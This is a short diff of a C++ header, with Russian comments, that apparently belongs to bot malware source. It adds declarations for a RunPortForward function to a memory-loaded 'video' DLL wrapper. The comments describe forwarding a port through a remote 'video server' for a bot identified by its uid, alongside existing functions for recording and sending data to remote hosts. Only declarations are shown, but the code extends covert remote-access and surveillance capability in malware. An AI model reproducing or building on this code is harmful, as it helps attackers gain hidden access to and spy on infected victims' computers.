@@ -43,6 +43,11 @@ private:
 	typedef VOID (WINAPI *TResetTimer	)();
 
 	typedef VOID (WINAPI *TStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
+
+	//проброс порта через видео сервер, uid - ид бота, ip:port - айпи адрес и порта видео сервера
+	//порт который нужно пробросить передает видео сервер. Функция создает отдельный поток, поэтому сразу
+	//завершает работу
+	typedef VOID (WINAPI *TRunPortForward)( const char* uid, const char* ip, int port );
 	//
 	//
 	HMEMORYMODULE FHandle;
@@ -58,6 +63,7 @@ public:
 	TStopRec          Stop;
 	TResetTimer       ResetTimer;
 	TStartSend        SendData;
+	TRunPortForward   RunPortForward;
 };
 
 
@@ -95,6 +101,10 @@ public:
 //Функция возвращает адрес сервера для записи видео
 PCHAR GetVideoRecHost1();
 PCHAR GetVideoRecHost2();
+//запускает проброс порта, в параметрах указывается айпи видео сервера (порт сервера зашит в функции), порт который нужно 
+//пробросить передаст видео сервер, эта функция запускает видео-длл и сама видео-длл ждет номер порта
+//для проброса, возвращает указатель на библиотеку, чтобы удалить после использования
+TVideoRecDLL* RunPortForward( const char* ip );
 
 
 
